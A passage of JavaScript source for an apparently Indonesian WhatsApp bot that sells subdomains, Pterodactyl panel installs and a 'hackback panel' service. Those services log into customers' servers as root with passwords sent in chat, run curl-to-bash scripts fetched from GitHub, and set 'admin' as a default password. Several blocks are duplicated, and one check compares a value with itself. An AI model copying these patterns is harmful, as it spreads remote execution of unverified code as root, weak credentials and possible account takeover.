    function subDomain1(hostname, ip) {
        return new Promise((resolve) => {
            let zone = global.zona1;
            let apitoken = global.apitoken1;
            let tld = global.domain1;

            axios
                .post(
                    `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                    {
                        type: "A",
                        name: hostname + "." + tld,
                        content: ip,
                        ttl: 3600,
                        priority: 10,
                        proxied: false,
                    },
                    {
                        headers: {
                            Authorization: "Bearer " + apitoken,
                            "Content-Type": "application/json",
                        },
                    }
                )
                .then((response) => {
                    let res = response.data;
                    if (res.success) {
                        resolve({
                            success: true,
                            zone: res.result?.zone_name,
                            name: res.result?.name,
                            ip: res.result?.content,
                        });
                    } else {
                        resolve({ success: false, error: "Unknown error occurred" });
                    }
                })
                .catch((error) => {
                    let err1 =
                        error.response?.data?.errors?.[0]?.message ||
                        error.response?.data?.errors ||
                        error.response?.data ||
                        error.response ||
                        error.message;
                    resolve({ success: false, error: String(err1) });
                });
        });
    }

    let raw1 = args?.join(" ")?.trim();
    if (!raw1) return Reply("Mana host & IP-nya?");
    let host0 = raw1
        .split("|")[0]
        .trim()
        .replace(/[^a-z0-9.-]/gi, "");
    if (!host0) return Reply("Host tidak valid, pastikan hanya mengandung huruf, angka, - (strip), dan . (titik)");
    let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
    if (!ip1 || ip1.split(".").length !== 4 || ip1.split(".").some((seg) => isNaN(seg) || seg < 0 || seg > 255)) {
        return Reply(ip1 ? "IP tidak valid" : "Mana IP-nya?");
    }

    const amount = 1000;

    try {
        const get = await axios.get(`${global.webapi}/api/orkut/createpayment?amount=${amount}&codeqr=${global.qrisOrderKuota}&apikey=${global.restapi}`)
        const teks3 = `
        *乂 INFORMASI PEMBAYARAN*
        
        *ァ ID :* ${get.data.result.transactionId}
        *ァ Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
        *ァ Barang :* Subdomain
        *ァ Expired :* 5 menit
        
        *Note :* 
        Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
        Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.
        
        Ketik *.batalbeli* untuk membatalkan
        `
        let msgQr = await gisnaxd.sendMessage(m.chat, {
        footer: ` ${botname}`,
        buttons: [
            {
            buttonId: `.batalbeli`,
            buttonText: { displayText: 'Batalkan Pembelian' },
            type: 1
            }
        ],
        headerType: 1,
        viewOnce: true,
        image: {url: get.data.result.qrImageUrl}, 
        caption: teks3,
        contextInfo: {
        mentionedJid: [m.sender]
        },
        })
        db.users[m.sender].status_deposit = true
        db.users[m.sender].saweria = {
        msg: msgQr, 
        chat: m.sender,
        idDeposit: get.data.result.transactionId, 
        amount: get.data.result.amount.toString(), 
        exp: function () {
        setTimeout(async () => {
        if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
        await gisnaxd.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
        await gisnaxd.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
        db.users[m.sender].status_deposit = false
        await clearInterval(db.users[m.sender].saweria.exp)
        delete db.users[m.sender].saweria
        }
        }, 300000)
        }
        }
        
        await db.users[m.sender].saweria.exp()
        
        while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
        await sleep(8000)
        const resultcek = await axios.get(`${global.webapi}/api/orkut/cekstatus?merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}&apikey=${global.restapi}`)
        const req = await resultcek.data
        if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
        db.users[m.sender].status_deposit = false
        await clearInterval(db.users[m.sender].saweria.exp)
        let transaksiSukses = {
          id: db.users[m.sender].saweria.idDeposit,
          user: m.sender,
          amount: db.users[m.sender].saweria.amount,
          method: "QRIS"
      };
  
      await sendPaymentNotificationToOwner(transaksiSukses);
        
        await subDomain1(host0, ip1).then((result) => {
            if (result.success) {
                Reply(`✅ *Subdomain berhasil dibuat!*\n\n🌐 *Domain:* ${result.name}\n🖥️ *IP:* ${result.ip}\n\nTerima kasih telah menggunakan layanan kami!`);
            } else {
                Reply(`❌ Gagal membuat subdomain\n📌 *Pesan:* ${result.error}`);
            }
        });
        }
        }
    } catch (error) {
        console.error('Error:', error);
        Reply('❌ Gagal memproses transaksi. Silakan coba lagi.');
    }
    break;
}

case 'domain1':
{
    if (m.isGroup) return Reply("Buy Domain hanya dapat dilakukan melalui private chat.");
    if (db.users[m.sender].status_deposit) return Reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");

    function subDomain1(hostname, ip) {
        return new Promise((resolve) => {
            let zone = global.zona1;
            let apitoken = global.apitoken1;
            let tld = global.domain1;

            axios
                .post(
                    `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                    {
                        type: "A",
                        name: hostname + "." + tld,
                        content: ip,
                        ttl: 3600,
                        priority: 10,
                        proxied: false,
                    },
                    {
                        headers: {
                            Authorization: "Bearer " + apitoken,
                            "Content-Type": "application/json",
                        },
                    }
                )
                .then((response) => {
                    let res = response.data;
                    if (res.success) {
                        resolve({
                            success: true,
                            zone: res.result?.zone_name,
                            name: res.result?.name,
                            ip: res.result?.content,
                        });
                    } else {
                        resolve({ success: false, error: "Unknown error occurred" });
                    }
                })
                .catch((error) => {
                    let err1 =
                        error.response?.data?.errors?.[0]?.message ||
                        error.response?.data?.errors ||
                        error.response?.data ||
                        error.response ||
                        error.message;
                    resolve({ success: false, error: String(err1) });
                });
        });
    }

    let raw1 = args?.join(" ")?.trim();
    if (!raw1) return Reply("Mana host & IP-nya?");
    let host0 = raw1
        .split("|")[0]
        .trim()
        .replace(/[^a-z0-9.-]/gi, "");
    if (!host0) return Reply("Host tidak valid, pastikan hanya mengandung huruf, angka, - (strip), dan . (titik)");
    let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
    if (!ip1 || ip1.split(".").length !== 4 || ip1.split(".").some((seg) => isNaN(seg) || seg < 0 || seg > 255)) {
        return Reply(ip1 ? "IP tidak valid" : "Mana IP-nya?");
    }

    const amount = 1000;

    try {
        const get = await axios.get(`${global.webapi}/api/orkut/createpayment?amount=${amount}&codeqr=${global.qrisOrderKuota}&apikey=${global.restapi}`)
        const teks3 = `
        *乂 INFORMASI PEMBAYARAN*
        
        *ァ ID :* ${get.data.result.transactionId}
        *ァ Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
        *ァ Barang :* Subdomain
        *ァ Expired :* 5 menit
        
        *Note :* 
        Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
        Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.
        
        Ketik *.batalbeli* untuk membatalkan
        `
        let msgQr = await gisnaxd.sendMessage(m.chat, {
        footer: ` ${botname}`,
        buttons: [
            {
            buttonId: `.batalbeli`,
            buttonText: { displayText: 'Batalkan Pembelian' },
            type: 1
            }
        ],
        headerType: 1,
        viewOnce: true,
        image: {url: get.data.result.qrImageUrl}, 
        caption: teks3,
        contextInfo: {
        mentionedJid: [m.sender]
        },
        })
        db.users[m.sender].status_deposit = true
        db.users[m.sender].saweria = {
        msg: msgQr, 
        chat: m.sender,
        idDeposit: get.data.result.transactionId, 
        amount: get.data.result.amount.toString(), 
        exp: function () {
        setTimeout(async () => {
        if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
        await gisnaxd.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
        await gisnaxd.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
        db.users[m.sender].status_deposit = false
        await clearInterval(db.users[m.sender].saweria.exp)
        delete db.users[m.sender].saweria
        }
        }, 300000)
        }
        }
        
        await db.users[m.sender].saweria.exp()
        
        while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
        await sleep(8000)
        const resultcek = await axios.get(`${global.webapi}/api/orkut/cekstatus?merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}&apikey=${global.restapi}`)
        const req = await resultcek.data
        if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
        db.users[m.sender].status_deposit = false
        await clearInterval(db.users[m.sender].saweria.exp)
        let transaksiSukses = {
          id: db.users[m.sender].saweria.idDeposit,
          user: m.sender,
          amount: db.users[m.sender].saweria.amount,
          method: "QRIS"
      };
  
      await sendPaymentNotificationToOwner(transaksiSukses);
        
        await subDomain1(host0, ip1).then((result) => {
            if (result.success) {
                Reply(`✅ *Subdomain berhasil dibuat!*\n\n🌐 *Domain:* ${result.name}\n🖥️ *IP:* ${result.ip}\n\nTerima kasih telah menggunakan layanan kami!`);
            } else {
                Reply(`❌ Gagal membuat subdomain\n📌 *Pesan:* ${result.error}`);
            }
        });
        }
        }
    } catch (error) {
        console.error('Error:', error);
        Reply('❌ Gagal memproses transaksi. Silakan coba lagi.');
    }
    break;
}


case 'domain1':
{
    if (m.isGroup) return Reply("Buy Domain hanya dapat dilakukan melalui private chat.");
    if (db.users[m.sender].status_deposit) return Reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");

    function subDomain1(hostname, ip) {
        return new Promise((resolve) => {
            let zone = global.zona1;
            let apitoken = global.apitoken1;
            let tld = global.domain1;

            axios
                .post(
                    `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                    {
                        type: "A",
                        name: hostname + "." + tld,
                        content: ip,
                        ttl: 3600,
                        priority: 10,
                        proxied: false,
                    },
                    {
                        headers: {
                            Authorization: "Bearer " + apitoken,
                            "Content-Type": "application/json",
                        },
                    }
                )
                .then((response) => {
                    let res = response.data;
                    if (res.success) {
                        resolve({
                            success: true,
                            zone: res.result?.zone_name,
                            name: res.result?.name,
                            ip: res.result?.content,
                        });
                    } else {
                        resolve({ success: false, error: "Unknown error occurred" });
                    }
                })
                .catch((error) => {
                    let err1 =
                        error.response?.data?.errors?.[0]?.message ||
                        error.response?.data?.errors ||
                        error.response?.data ||
                        error.response ||
                        error.message;
                    resolve({ success: false, error: String(err1) });
                });
        });
    }

    let raw1 = args?.join(" ")?.trim();
    if (!raw1) return Reply("Mana host & IP-nya?");
    let host0 = raw1
        .split("|")[0]
        .trim()
        .replace(/[^a-z0-9.-]/gi, "");
    if (!host0) return Reply("Host tidak valid, pastikan hanya mengandung huruf, angka, - (strip), dan . (titik)");
    let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
    if (!ip1 || ip1.split(".").length !== 4 || ip1.split(".").some((seg) => isNaN(seg) || seg < 0 || seg > 255)) {
        return Reply(ip1 ? "IP tidak valid" : "Mana IP-nya?");
    }

    const amount = 1000;

    try {
        const get = await axios.get(`${global.webapi}/api/orkut/createpayment?amount=${amount}&codeqr=${global.qrisOrderKuota}&apikey=${global.restapi}`)
        const teks3 = `
        *乂 INFORMASI PEMBAYARAN*
        
        *ァ ID :* ${get.data.result.transactionId}
        *ァ Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
        *ァ Barang :* Subdomain
        *ァ Expired :* 5 menit
        
        *Note :* 
        Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
        Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.
        
        Ketik *.batalbeli* untuk membatalkan
        `
        let msgQr = await gisnaxd.sendMessage(m.chat, {
        footer: ` ${botname}`,
        buttons: [
            {
            buttonId: `.batalbeli`,
            buttonText: { displayText: 'Batalkan Pembelian' },
            type: 1
            }
        ],
        headerType: 1,
        viewOnce: true,
        image: {url: get.data.result.qrImageUrl}, 
        caption: teks3,
        contextInfo: {
        mentionedJid: [m.sender]
        },
        })
        db.users[m.sender].status_deposit = true
        db.users[m.sender].saweria = {
        msg: msgQr, 
        chat: m.sender,
        idDeposit: get.data.result.transactionId, 
        amount: get.data.result.amount.toString(), 
        exp: function () {
        setTimeout(async () => {
        if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
        await gisnaxd.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
        await gisnaxd.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
        db.users[m.sender].status_deposit = false
        await clearInterval(db.users[m.sender].saweria.exp)
        delete db.users[m.sender].saweria
        }
        }, 300000)
        }
        }
        
        await db.users[m.sender].saweria.exp()
        
        while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
        await sleep(8000)
        const resultcek = await axios.get(`${global.webapi}/api/orkut/cekstatus?merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}&apikey=${global.restapi}`)
        const req = await resultcek.data
        if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
        db.users[m.sender].status_deposit = false
        await clearInterval(db.users[m.sender].saweria.exp)
        let transaksiSukses = {
          id: db.users[m.sender].saweria.idDeposit,
          user: m.sender,
          amount: db.users[m.sender].saweria.amount,
          method: "QRIS"
      };
  
      await sendPaymentNotificationToOwner(transaksiSukses);
        
        await subDomain1(host0, ip1).then((result) => {
            if (result.success) {
                Reply(`✅ *Subdomain berhasil dibuat!*\n\n🌐 *Domain:* ${result.name}\n🖥️ *IP:* ${result.ip}\n\nTerima kasih telah menggunakan layanan kami!`);
            } else {
                Reply(`❌ Gagal membuat subdomain\n📌 *Pesan:* ${result.error}`);
            }
        });
        }
        }
    } catch (error) {
        console.error('Error:', error);
        Reply('❌ Gagal memproses transaksi. Silakan coba lagi.');
    }
    break;
}


case 'domain1':
{
    if (m.isGroup) return Reply("Buy Domain hanya dapat dilakukan melalui private chat.");
    if (db.users[m.sender].status_deposit) return Reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");

    function subDomain1(hostname, ip) {
        return new Promise((resolve) => {
            let zone = global.zona1;
            let apitoken = global.apitoken1;
            let tld = global.domain1;

            axios
                .post(
                    `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                    {
                        type: "A",
                        name: hostname + "." + tld,
                        content: ip,
                        ttl: 3600,
                        priority: 10,
                        proxied: false,
                    },
                    {
                        headers: {
                            Authorization: "Bearer " + apitoken,
                            "Content-Type": "application/json",
                        },
                    }
                )
                .then((response) => {
                    let res = response.data;
                    if (res.success) {
                        resolve({
                            success: true,
                            zone: res.result?.zone_name,
                            name: res.result?.name,
                            ip: res.result?.content,
                        });
                    } else {
                        resolve({ success: false, error: "Unknown error occurred" });
                    }
                })
                .catch((error) => {
                    let err1 =
                        error.response?.data?.errors?.[0]?.message ||
                        error.response?.data?.errors ||
                        error.response?.data ||
                        error.response ||
                        error.message;
                    resolve({ success: false, error: String(err1) });
                });
        });
    }

    let raw1 = args?.join(" ")?.trim();
    if (!raw1) return Reply("Mana host & IP-nya?");
    let host0 = raw1
        .split("|")[0]
        .trim()
        .replace(/[^a-z0-9.-]/gi, "");
    if (!host0) return Reply("Host tidak valid, pastikan hanya mengandung huruf, angka, - (strip), dan . (titik)");
    let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
    if (!ip1 || ip1.split(".").length !== 4 || ip1.split(".").some((seg) => isNaN(seg) || seg < 0 || seg > 255)) {
        return Reply(ip1 ? "IP tidak valid" : "Mana IP-nya?");
    }

    const amount = 1000;
    if (await processPayment(m, amount)){
    } else {
    try {
        const get = await axios.get(`${global.webapi}/api/orkut/createpayment?amount=${amount}&codeqr=${global.qrisOrderKuota}&apikey=${global.restapi}`)
        const teks3 = `
        *乂 INFORMASI PEMBAYARAN*
        
        *ァ ID :* ${get.data.result.transactionId}
        *ァ Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
        *ァ Barang :* Subdomain
        *ァ Expired :* 5 menit
        
        *Note :* 
        Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
        Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.
        
        Ketik *.batalbeli* untuk membatalkan
        `
        let msgQr = await gisnaxd.sendMessage(m.chat, {
        footer: ` ${botname}`,
        buttons: [
            {
            buttonId: `.batalbeli`,
            buttonText: { displayText: 'Batalkan Pembelian' },
            type: 1
            }
        ],
        headerType: 1,
        viewOnce: true,
        image: {url: get.data.result.qrImageUrl}, 
        caption: teks3,
        contextInfo: {
        mentionedJid: [m.sender]
        },
        })
        db.users[m.sender].status_deposit = true
        db.users[m.sender].saweria = {
        msg: msgQr, 
        chat: m.sender,
        idDeposit: get.data.result.transactionId, 
        amount: get.data.result.amount.toString(), 
        exp: function () {
        setTimeout(async () => {
        if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
        await gisnaxd.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
        await gisnaxd.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
        db.users[m.sender].status_deposit = false
        await clearInterval(db.users[m.sender].saweria.exp)
        delete db.users[m.sender].saweria
        }
        }, 300000)
        }
        }
        
        await db.users[m.sender].saweria.exp()
        
        while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
        await sleep(8000)
        const resultcek = await axios.get(`${global.webapi}/api/orkut/cekstatus?merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}&apikey=${global.restapi}`)
        const req = await resultcek.data
        if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
        db.users[m.sender].status_deposit = false
        await clearInterval(db.users[m.sender].saweria.exp)
        let transaksiSukses = {
          id: db.users[m.sender].saweria.idDeposit,
          user: m.sender,
          amount: db.users[m.sender].saweria.amount,
          method: "QRIS"
      };
  
      await sendPaymentNotificationToOwner(transaksiSukses);
        
        await subDomain1(host0, ip1).then((result) => {
            if (result.success) {
                Reply(`✅ *Subdomain berhasil dibuat!*\n\n🌐 *Domain:* ${result.name}\n🖥️ *IP:* ${result.ip}\n\nTerima kasih telah menggunakan layanan kami!`);
            } else {
                Reply(`❌ Gagal membuat subdomain\n📌 *Pesan:* ${result.error}`);
            }
        });
        }
        }
      } catch (error) {
        console.error("Terjadi kesalahan:", error);
        m.reply("❌ Terjadi kesalahan saat memproses pembayaran.");
    }
}
    break;
}
//==========Saweria
//===========Rekap-Pembayaran
case "rekap":
case "rekapsemuapenjualan":
    const laporan = await rekapTotalPendapatan();
    m.reply(laporan);
    break;
//==========JASAINSTALING
case "jasainstallpanel": {
  if (!text) return m.reply(example("ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*"));
  
  let vii = text.split("|");
  if (vii.length < 5) return m.reply(example("ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*"));
  
  let amount = 5000; // Gunakan RAM sebagai harga pembayaran
  
  if (await processPayment(m, amount)){
  } else {
  // Proses pembayaran menggunakan Orkut API
  const get = await axios.get(`${global.webapi}/api/orkut/createpayment?amount=${amount}&codeqr=${global.qrisOrderKuota}&apikey=${global.restapi}`)
  const teks3 = `
*乂 INFORMASI PEMBAYARAN*

*ァ ID :* ${get.data.result.transactionId}
*ァ Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
*ァ Barang :* Admin Panel Pterodactyl
*ァ Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan
`
let msgQr = await gisnaxd.sendMessage(m.chat, {
footer: ` ${botname}`,
buttons: [
  {
    buttonId: `.batalbeli`,
    buttonText: { displayText: 'Batalkan Pembelian' },
    type: 1
  }
],
headerType: 1,
viewOnce: true,
image: {url: get.data.result.qrImageUrl}, 
caption: teks3,
contextInfo: {
 mentionedJid: [m.sender]
},
})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.transactionId, 
amount: get.data.result.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await gisnaxd.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await gisnaxd.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`${global.webapi}/api/orkut/cekstatus?merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}&apikey=${global.restapi}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await gisnaxd.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

*ァ ID :* ${db.users[m.sender].saweria.idDeposit}
*ァ Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
*ァ Barang :* Admin Panel Pterodactyl
`}, {quoted: db.users[m.sender].saweria.msg})
let transaksiSukses = {
  id: db.users[m.sender].saweria.idDeposit,
  user: m.sender,
  amount: db.users[m.sender].saweria.amount,
  method: "QRIS"
};

await sendPaymentNotificationToOwner(transaksiSukses);
await onPaymentSuccess(m)
}
}

const ress = new Client();
const gisnaxdSettings = {
  host: vii[0],
  port: '22',
  username: 'root',
  password: vii[1]
};

const pass = "admin" + getRandom("")
let passwordPanel = pass
const domainpanel = vii[2]
const domainnode = vii[3]
const ramserver = vii[4]
const deletemysql = `\n`
const commandPanel = `bash <(curl -s https://pterodactyl-installer.se)`

async function instalWings() {
ress.exec(commandPanel, (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
ress.exec('bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/createnode.sh)', async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
let teks = `
*📦 Berikut Detail Akun Panel :*

* *Username :* admin
* *Password :* ${passwordPanel}
* *Domain :* ${domainpanel}

*Note :* Silahkan Buat Allocation & Ambil Token Wings Di Node Yang Sudah Di Buat Oleh Bot Untuk Menjalankan Wings

*Cara Menjalankan Wings :*
ketik *.startwings* ipvps|pwvps|tokenwings
`
await gisnaxd.sendMessage(m.chat, {text: teks}, {quoted: m})
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes("Masukkan nama lokasi: ")) {
stream.write('Singapore\n');
}
if (data.toString().includes("Masukkan deskripsi lokasi: ")) {
stream.write('Node By Skyzo\n');
}
if (data.toString().includes("Masukkan domain: ")) {
stream.write(`${domainnode}\n`);
}
if (data.toString().includes("Masukkan nama node: ")) {
stream.write('Node By Skyzo\n');
}
if (data.toString().includes("Masukkan RAM (dalam MB): ")) {
stream.write(`${ramserver}\n`);
}
if (data.toString().includes("Masukkan jumlah maksimum disk space (dalam MB): ")) {
stream.write(`${ramserver}\n`);
}
if (data.toString().includes("Masukkan Locid: ")) {
stream.write('1\n');
}
}).stderr.on('data', async (data) => {
console.log('Stderr : ' + data);
});
});
}).on('data', async (data) => {
if (data.toString().includes('Input 0-6')) {
stream.write('1\n');
}
if (data.toString().includes('(y/N)')) {
stream.write('y\n');
}
if (data.toString().includes('Enter the panel address (blank for any address)')) {
stream.write(`${domainpanel}\n`);
}
if (data.toString().includes('Database host username (pterodactyluser)')) {
stream.write('admin\n');
}
if (data.toString().includes('Database host password')) {
stream.write(`admin\n`);
}
if (data.toString().includes('Set the FQDN to use for Let\'s Encrypt (node.example.com)')) {
stream.write(`${domainnode}\n`);
}
if (data.toString().includes('Enter email address for Let\'s Encrypt')) {
stream.write('admin@gmail.com\n');
}
console.log('Logger: ' + data.toString())
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
});
})
}

async function instalPanel() {
ress.exec(commandPanel, (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await instalWings()
}).on('data', async (data) => {
if (data.toString().includes('Input 0-6')) {
stream.write('0\n');
} 
if (data.toString().includes('(y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Database name (panel)')) {
stream.write('\n');
}
if (data.toString().includes('Database username (pterodactyl)')) {
stream.write('admin\n');
}
if (data.toString().includes('Password (press enter to use randomly generated password)')) {
stream.write('admin\n');
} 
if (data.toString().includes('Select timezone [Europe/Stockholm]')) {
stream.write('Asia/Jakarta\n');
} 
if (data.toString().includes('Provide the email address that will be used to configure Let\'s Encrypt and Pterodactyl')) {
stream.write('admin@gmail.com\n');
} 
if (data.toString().includes('Email address for the initial admin account')) {
stream.write('admin@gmail.com\n');
} 
if (data.toString().includes('Username for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('First name for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('Last name for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('Password for the initial admin account')) {
stream.write(`${passwordPanel}\n`);
} 
if (data.toString().includes('Set the FQDN of this panel (panel.example.com)')) {
stream.write(`${domainpanel}\n`);
} 
if (data.toString().includes('Do you want to automatically configure UFW (firewall)')) {
stream.write('y\n')
} 
if (data.toString().includes('Do you want to automatically configure HTTPS using Let\'s Encrypt? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Select the appropriate number [1-2] then [enter] (press \'c\' to cancel)')) {
stream.write('1\n');
} 
if (data.toString().includes('I agree that this HTTPS request is performed (y/N)')) {
stream.write('y\n');
}
if (data.toString().includes('Proceed anyways (your install will be broken if you do not know what you are doing)? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('(yes/no)')) {
stream.write('y\n');
} 
if (data.toString().includes('Initial configuration completed. Continue with installation? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Still assume SSL? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Please read the Terms of Service')) {
stream.write('y\n');
}
if (data.toString().includes('(A)gree/(C)ancel:')) {
stream.write('A\n');
} 
console.log('Logger: ' + data.toString())
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
});
});
}

ress.on('ready', async () => {
await m.reply("Memproses *install* server panel \nTunggu 1-10 menit hingga proses selsai")
ress.exec(deletemysql, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await instalPanel();
}).on('data', async (data) => {
await stream.write('\t')
await stream.write('\n')
await console.log(data.toString())
}).stderr.on('data', async (data) => {
console.log('Stderr : ' + data);
});
});
}).gisnaxdect(gisnaxdSettings);
}
}
break  
//~~~~~~~~~~~~~~~~~~~~~~~~//SetPayment
//==============JasaHb
case "jasahbpanel": {
  let t = text.split('|');
  if (t.length < 2) return m.reply(example("ipvps|pwvps"));
  
  let ipvps = t[0];
  let passwd = t[1];
  let amount = 5000; // Harga layanan hackback panel

  // Periksa saldo pengguna sebelum pembayaran
  if (db.users[m.sender].saldo >= amount) {
      // Kurangi saldo langsung tanpa QRIS
      db.users[m.sender].saldo -= amount;
      m.reply(`✅ Saldo sebesar Rp${amount.toLocaleString()} telah dipotong untuk pembayaran.`);

      // Proses instalasi panel setelah pembayaran berhasil
      const newuser = "admin" + getRandom("");
      const newpw = "admin" + getRandom("");
      
      const gisnaxdSettings = {
          host: ipvps,
          port: '22',
          username: 'root',
          password: passwd
      };
      
      const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`;
      const ress = new Client();
      
      ress.on('ready', () => {
          ress.exec(command, (err, stream) => {
              if (err) throw err;
              stream.on('close', async (code, signal) => {    
                  let teks = `
*Hackback panel sukses *
*Berikut detail akun admin panel :*
* *Username :* ${newuser}
* *Password :* ${newpw}
`;
                  await gisnaxd.sendMessage(m.chat, {text: teks}, {quoted: m});
                  ress.end();
              }).on('data', async (data) => {
                  await console.log(data.toString());
              }).stderr.on('data', (data) => {
                  stream.write("skyzodev\n");
                  stream.write("7\n");
                  stream.write(`${newuser}\n`);
                  stream.write(`${newpw}\n`);
              });
          });
      }).on('error', (err) => {
          console.log('gisnaxdection Error: ' + err);
          m.reply('Katasandi atau IP tidak valid');
      }).gisnaxdect(gisnaxdSettings);
  } else {
      // Jika saldo tidak cukup, lanjutkan dengan pembayaran QRIS
      const get = await axios.get(`${global.webapi}/api/orkut/createpayment?amount=${amount}&codeqr=${global.qrisOrderKuota}&apikey=${global.restapi}`);
      const teks3 = `
          *乂 INFORMASI PEMBAYARAN*
          
           *ァ ID :* ${get.data.result.transactionId}
           *ァ Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
           *ァ Barang :* Admin Panel Pterodactyl
